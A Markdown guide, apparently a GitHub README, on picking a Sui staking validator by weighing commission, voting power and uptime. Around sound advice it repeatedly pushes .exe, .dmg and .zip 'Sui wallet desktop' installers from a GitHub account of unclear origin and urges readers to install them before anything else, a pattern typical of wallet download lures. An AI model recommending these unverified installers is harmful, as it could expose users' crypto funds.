![SUI Wallet](assets/banner-article.png)

# Choosing a Sui validator

Commission, voting power and uptime are the numbers that decide a delegation.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Validators differ in commission, uptime and how much stake they already hold, and the app shows all three beside each name. A low commission on a validator that misses epochs costs more than a higher one that performs. Read the four figures together rather than picking the largest rate on the list.

## What the list shows

Each validator appears with its rate, the commission it takes, its voting power and its uptime. Those are four different questions packed into one row: what it earns, what it keeps, how much of the network it already controls, and how reliably it has done the job.

A reader who sorts by rate alone has answered none of them. The rate is the headline, and the other three are what decide whether the headline arrives.

It is worth knowing what the list is not. It is not a ranking, it carries no recommendation, and the order of names means nothing about quality. The app shows figures and leaves the judgement to the reader, which is why the rest of this page is about reading them rather than about picking one.

## Commission and what it takes

Commission is the validator's cut of the rewards your stake earns, and it is charged before the rate reaches you. A validator advertising the highest rate with a commission well above its neighbours can leave you with less than a modest rate with a small cut.

The practical move is to compare the rate and commission together, and to prefer a validator whose commission is not an outlier in either direction. A commission that is dramatically lower than everyone else's is worth a second look rather than a rush.

One habit makes the comparison honest: convert both validators to a net figure before deciding, and do it in the same minute. Rates move, so a comparison assembled from two readings an hour apart is a comparison of two different networks, and it will not survive the first look at the list.

## Stake concentration and why it matters

Voting power is how much stake a validator already holds, and it measures the network's health rather than only the validator's popularity. Spreading stake across validators keeps any single one from dominating the set, which is a reason to weigh it even when returns look identical.

That gives a reader a tie-breaker that has nothing to do with personal return: when two validators look equal on rate and commission, the one holding less stake is the one that improves the network's distribution.

## Uptime and missed epochs

Uptime is the record of whether the validator has been doing its job. A validator that misses epochs earns less in those epochs, whatever its advertised rate says, which is why uptime is the figure to check before committing a large position.

The relationship is simple and worth stating plainly: rate is a possibility, uptime is the record. Where the two disagree, the record wins.

A validator's record is also the only figure that cannot be bought or advertised into existence. Rate can be set, commission can be cut, voting power can grow; uptime is what happened. For a position large enough that a bad epoch would matter, that asymmetry is the reason to look at uptime last but weigh it most.

## Changing a validator

A stake can be moved, but not by editing it in place: the existing position has to be unstaked and a new one delegated. That means the choice is worth a few minutes rather than a reflexive click, because changing it later costs a transaction and a wait.

[Staking SUI in the wallet app](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/staking-sui-in-the-wallet-app.md) covers the delegate step itself, and
[Unstaking SUI and epoch timing](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/unstaking-sui-and-epoch-timing.md) covers what has to happen before the stake is free to move.

Two transactions and a wait, then the same decision again at the new validator - which is why the first choice is worth a minute of reading. A position moved every month on impressions pays more in fees and attention than it gains in rate.

## Reading the figures without over-reading them

Two cautions. Past performance is a record, not a forecast: a validator with perfect uptime can still fall behind next month. And the rate shown is a snapshot of network conditions, so comparing two validators on rate alone compares two numbers that will both move.

What a reader can control is the shape of the choice: avoid a single validator for a large position, avoid an outlier commission in either direction, and prefer a record over a promise.
[SUI staking APY explained](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-staking-apy-explained.md) explains where the rate comes from and why it changes.

The figures are read from the app, so a row that looks wrong or a screen that is missing is a build question: install the current release from the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) and compare again before concluding the list is broken.

## FAQ

### Which validator gives the best return?

None, permanently. Compare rate against commission, check uptime, and spread a large position across more than one validator rather than chasing the highest number on the list.

### Is a lower commission always better?

No. A commission far below the rest of the list can be a temporary offer; what it does not tell you is whether the validator performs. Rate minus commission, checked against uptime, is the honest comparison.

### How many validators should I use?

More than one if the position is large enough to matter to you. Splitting it reduces the effect of any single validator's bad month and improves the network's distribution.

### Can I change validator without unstaking?

No. Moving a stake means unstaking the position and delegating again, which is two transactions and a wait rather than a setting.

### Does voting power affect my rewards?

Not directly. It affects how concentrated the network is, which is a reason to weigh it when two validators otherwise look equal.
